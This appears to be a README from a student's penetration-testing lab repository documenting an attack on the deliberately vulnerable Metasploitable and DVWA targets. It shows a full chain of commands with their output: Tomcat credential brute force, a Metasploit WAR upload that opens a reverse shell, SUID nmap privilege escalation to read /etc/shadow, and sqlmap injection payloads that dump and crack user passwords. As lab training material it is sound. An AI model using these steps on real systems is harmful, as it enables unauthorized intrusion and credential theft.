# Vulnerability Assessment and Penetration Testing (VAPT) 

## Overview
This repository documents a structured Vulnerability Assessment and Penetration
Testing (VAPT) workflow carried out in an authorized and controlled lab
environment. The objective is to demonstrate practical security testing skills,
methodology, and proper technical documentation.

The workflow covers network-level assessment, manual exploitation, post-
exploitation validation, web application testing, and automated vulnerability
scanning.

---

## Scope and Authorization
- Target Type: Deliberately vulnerable systems
- Testing Type: Educational / Authorized lab assessment
- Scope: Network services, system-level vulnerabilities, and web application
  vulnerabilities
- All activities were performed strictly for learning and demonstration purposes

---

## VAPT Workflow Summary

1. Network Scanning and Enumeration  
2. Vulnerability Identification  
3. Exploitation  
4. Post-Exploitation  
5. Web Application VAPT (DVWA)  
6. Automated Vulnerability Scanning 

---

## Phase 1: Network Scanning and Enumeration

**Tool Used:** Nmap  

### Activities
- Full TCP port scanning
- Service and version detection
- Identification of exposed and potentially vulnerable services

###  Command Used
```
nmap -sV  192.168.56.5 -oN nmap_scan.txt
# Nmap 7.98 scan initiated Mon Jan  5 04:25:28 2026 as: /usr/lib/nmap/nmap --privileged -sV -oN nmap_scan.txt 192.168.56.5
Nmap scan report for 192.168.56.5
Host is up (0.0033s latency).
Not shown: 977 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  5 04:25:44 2026 -- 1 IP address (1 host up) scanned in 16.46 seconds
```
### Outcome
Multiple network services were identified running outdated or insecure versions,
indicating a broad attack surface for further assessment.


## Phase 2: Vulnerability Identification
Based on enumeration results, identified services were analyzed for known
weaknesses and misconfigurations.

### Key Observations
Insecure and legacy services exposed to the network

### Weak authentication mechanisms

Services commonly associated with publicly known exploits

A vulnerability mapping table was created to correlate services with risk level
and potential impact.

### Documentation

| Port | Service | Version | Risk | Reason |
|------|--------|---------|------|--------|
| 21 | FTP | vsftpd 2.3.4 | High | Known backdoor vulnerability |
| 23 | Telnet | Linux telnetd | High | Cleartext authentication |
| 139/445 | SMB | Samba 3.x | Critical | Multiple RCE vulnerabilities |
| 1524 | bindshell | Metasploitable root shell | Critical | Unauthenticated root access |
| 8180 | HTTP | Apache Tomcat | High | Weak credentials / RCE |



## Phase 3: Exploitation

Tool Used: Metasploit Framework

The exploitation phase began with the identification of exposed Apache Tomcat Manager services during enumeration. The auxiliary/scanner/http/tomcat_mgr_login module was used to test default and weak credentials against the Tomcat Manager interface, resulting in the discovery of valid authentication credentials. Using the identified credentials, the exploit/multi/http/tomcat_mgr_upload module was leveraged to upload a malicious WAR file via the Tomcat Manager application. Successful deployment and execution of the payload provided remote code execution on the target system, resulting in an initial low-privileged shell.

### Activities
```

msf > search auxiliary/scanner/http/tomcat_mgr_logi

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tomcat_mgr_login  .                normal  No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/tomcat_mgr_login

msf > use 0
msf auxiliary(scanner/http/tomcat_mgr_login) > options                                                                                                      
                                                                                                                                                            
Module options (auxiliary/scanner/http/tomcat_mgr_login):                                                                                                   
                                                                                                                                                            
   Name              Current Setting                              Required  Description                                                                     
   ----              ---------------                              --------  -----------                                                                     
   ANONYMOUS_LOGIN   false                                        yes       Attempt to login with a blank username and password                             
   BLANK_PASSWORDS   false                                        no        Try blank passwords for all users                                               
   BRUTEFORCE_SPEED  5                                            yes       How fast to bruteforce, from 0 to 5                                             
   DB_ALL_CREDS      false                                        no        Try each user/password couple stored in the current database                    
   DB_ALL_PASS       false                                        no        Add all passwords in the current database to the list                           
   DB_ALL_USERS      false                                        no        Add all users in the current database to the list                               
   DB_SKIP_EXISTING  none                                         no        Skip existing credentials stored in the current database (Accepted: none, user  
                                                                            , user&realm)                                                                   
   PASSWORD                                                       no        The HTTP password to specify for authentication                                 
   PASS_FILE         /usr/share/metasploit-framework/data/wordli  no        File containing passwords, one per line                                         
                     sts/tomcat_mgr_default_pass.txt                                                                                                        
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxie  
                                                                            s: sapni, socks4, socks5, socks5h, http                                         
   RHOSTS                                                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi  
                                                                            cs/using-metasploit.html                                                        
   RPORT             8080                                         yes       The target port (TCP)                                                           
   SSL               false                                        no        Negotiate SSL/TLS for outgoing connections                                      
   STOP_ON_SUCCESS   false                                        yes       Stop guessing when a credential works for a host                                
   TARGETURI         /manager/html                                yes       URI for Manager login. Default is /manager/html                                 
   THREADS           1                                            yes       The number of concurrent threads (max one per host)                             
   USERNAME                                                       no        The HTTP username to specify for authentication                                 
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordli  no        File containing users and passwords separated by space, one pair per line       
                     sts/tomcat_mgr_default_userpass.txt                                                                                                    
   USER_AS_PASS      false                                        no        Try the username as the password for all users                                  
   USER_FILE         /usr/share/metasploit-framework/data/wordli  no        File containing users, one per line                                             
                     sts/tomcat_mgr_default_users.txt                                                                                                       
   VERBOSE           true                                         yes       Whether to print output for all attempts                                        
   VHOST                                                          no        HTTP server virtual host                                                        


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
rport => 8180
msf auxiliary(scanner/http/tomcat_mgr_login) > run
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[-] 192.168.56.5:8180 - LOGIN FAILED: root:toor (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: root:password1 (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: root:j2deployer (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: root:kdsxc (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: root:owaspba (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: root:ADMIN (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: root:xampp (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:root (Incorrect)
[+] 192.168.56.5:8180 - Login Successful: tomcat:tomcat
[-] 192.168.56.5:8180 - LOGIN FAILED: both:admin (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:manager (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:role1 (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:root (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:tomcat (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:s3cret (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:vagrant (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:QLogic66 (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:password (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:Password1 (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:changethis (Incorrect)
[-] 192.168.56.5:8180 - LOGIN FAILED: both:r00t (Incorrect)

msf auxiliary(scanner/http/tomcat_mgr_login) > search tomcat_mgr_upload

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_upload  2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   1    \_ target: Java Universal           .                .          .      .
   2    \_ target: Windows Universal        .                .          .      .
   3    \_ target: Linux x86                .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/tomcat_mgr_upload
After interacting with a module you can manually set a TARGET with set TARGET 'Linux x86'

msf exploit(multi/http/tomcat_mgr_upload) > set httppassword tomcat
httppassword => tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set lhost 192.168.56.3
lhost => 192.168.56.3
msf exploit(multi/http/tomcat_mgr_upload) > set rport 8180
rport => 8180
msf exploit(multi/http/tomcat_mgr_upload) > set rhosts 192.168.56.5
rhosts => 192.168.56.5
msf exploit(multi/http/tomcat_mgr_upload) > run
[*] Started reverse TCP handler on 192.168.56.3:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying kMq3r2BYfNT...
[*] Executing kMq3r2BYfNT...
[*] Undeploying kMq3r2BYfNT ...
[*] Undeployed at /manager/html/undeploy
[*] Sending stage (58073 bytes) to 192.168.56.5
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (192.168.56.3:4444 -> 192.168.56.5:37998) at 2026-01-06 04:55:45 -0500

meterpreter > 


```
### Result
The target system was successfully compromised through the Apache Tomcat Manager interface, resulting in remote code execution and the establishment of an initial low-privileged shell. This confirms a high-severity vulnerability due to insecure credential management and improper access control on the Tomcat Manager service.



## Phase 4: Post-Exploitation
### Activities
Verification of privilege level
```
meterpreter > sysinfo
Computer        : metasploitable
OS              : Linux 2.6.24-16-server (i386)
Architecture    : x86
System Language : en_US
Meterpreter     : java/linux
meterpreter > getuid
Server username: tomcat55
meterpreter > shell
Process 1 created.
Channel 1 created.
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
/bin/bash
which bash
/bin/bash
/bin/bash -i
bash: no job control in this shell
tomcat55@metasploitable:/$ cat /etc/shadow
cat: /etc/shadow: Permission denied
tomcat55@metasploitable:/$ find / -perm -4000 2>>/dev/null
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
tomcat55@metasploitable:/$ ls -la /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
tomcat55@metasploitable:/$ /usr/bin/nmap --interactive
Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
cat /etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::




```

### Outcome
Post-exploitation confirmed complete system control, validating the severity of
the identified vulnerabilities.


## Phase 5: Web Application VAPT (DVWA)
### Application Tested: Damn Vulnerable Web Application (DVWA)

### Vulnerability Identified
SQL Injection due to improper input validation

### Exploitation Method
Authenticated SQL Injection testing was performed using automated tooling.

```
sqlmap -u "http://<target-ip>/vulnerabilities/sqli/?id=1&Submit=Submit#" \
--cookie="security=low; PHPSESSID=<session-id>" \
-D dvwa -T users --dump
```
### Results
```
 sqlmap -u "http://10.49.143.189/vulnerabilities/sqli/?id=1&Submit=Submit#" \
--cookie="security=low; PHPSESSID=5u9v55ie912m05ctdksqf596b6" \
-D dvwa -T users --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.9.12#stable}                                                                                                                                                                                                   
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:31:34 /2026-01-05/

[07:31:34] [INFO] resuming back-end DBMS 'mysql' 
[07:31:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 6997=6997#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 2174 FROM(SELECT COUNT(*),CONCAT(0x7170627a71,(SELECT (ELT(2174=2174,1))),0x716a767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TgsJ&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3295 FROM (SELECT(SLEEP(5)))Tssx)-- xZdl&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7170627a71,0x42615a4568506b775a6c4d416753524b4a5873626c6c587072597261684f795054716c656d4b5848,0x716a767171),NULL#&Submit=Submit
---
[07:31:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0

[07:32:22] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[07:32:22] [INFO] starting 4 processes 
[07:32:23] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                                                                                                                                                    
[07:32:23] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                                                                                                                                                   
[07:32:24] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                                                                                                                                                   
[07:32:25] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                                                                                                                                                  
Database: dvwa                                                                                                                                                                                                                             
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2018-10-03 22:09:36 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2018-10-03 22:09:36 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2018-10-03 22:09:36 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2018-10-03 22:09:36 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2018-10-03 22:09:36 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

[07:32:28] [INFO] table 'dvwa.users' dumped to CSV file '/home/joe/.local/share/sqlmap/output/10.49.143.189/dump/dvwa/users.csv'
[07:32:28] [INFO] fetched data logged to text files under '/home/joe/.local/share/sqlmap/output/10.49.143.189'

```
Backend DBMS identified as MySQL
Databases and tables enumerated successfully
Sensitive user information extracted from the users table
Multiple SQL Injection techniques confirmed:
Boolean-based
Error-based
Time-based
UNION-based



## Phase 6: Automated Vulnerability Scanning (OpenVAS)
Tool: OpenVAS / Greenbone Vulnerability Manager
```
needs to be configured
```


### Key Takeaways
Manual enumeration is essential for accurate vulnerability discovery

Exploitation validates real-world impact beyond automated scan results

Authenticated web application testing exposes critical vulnerabilities

Automated tools support, but do not replace, structured methodology


